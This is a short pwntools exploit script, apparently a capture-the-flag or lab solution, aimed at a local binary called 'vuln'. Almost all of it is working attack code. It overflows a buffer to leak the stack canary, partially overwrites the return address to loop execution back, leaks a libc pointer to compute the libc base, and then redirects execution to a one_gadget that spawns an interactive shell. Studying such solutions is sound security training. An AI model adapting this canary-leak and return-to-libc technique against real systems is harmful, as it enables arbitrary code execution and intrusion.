from pwn import *
# rbp - 0x20
context.arch = 'amd64'
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

p = process('vuln')
elf = ELF('vuln')
libc = ELF('/lib/x86_64-linux-gnu/libc-2.31.so')

p.recvuntil(b'\n')
p.send(b'a' * 0x19)
p.recvuntil(b'message: ')
canary = b'\x00' + p.recvline()[0x19:0x19 + 0x7]
print(canary)
print(len(canary))
p.recvuntil(b'?\n')
p.sendline(b'y')
p.send(b'a' * 0x18 + canary + b'a' * 0x8 + b'\x10')

p.recvuntil(b'message.\n')
p.send(b'a' * 0x19 + canary[1:] + b'a' * 0x8)
p.recvuntil(canary[1:] + b'a' * 0x8)
libc_base = u64(p.recvline()[:-1] + b'\x00' * 0x2) - 0x24083
print("libc base:", hex(libc_base))

one_gadget = libc_base + 0xe3b01

p.recvuntil(b'?\n')
p.sendline(b'y')
p.send(b'a' * 0x18 + canary + b'a' * 0x8 + p64(one_gadget))

p.interactive()
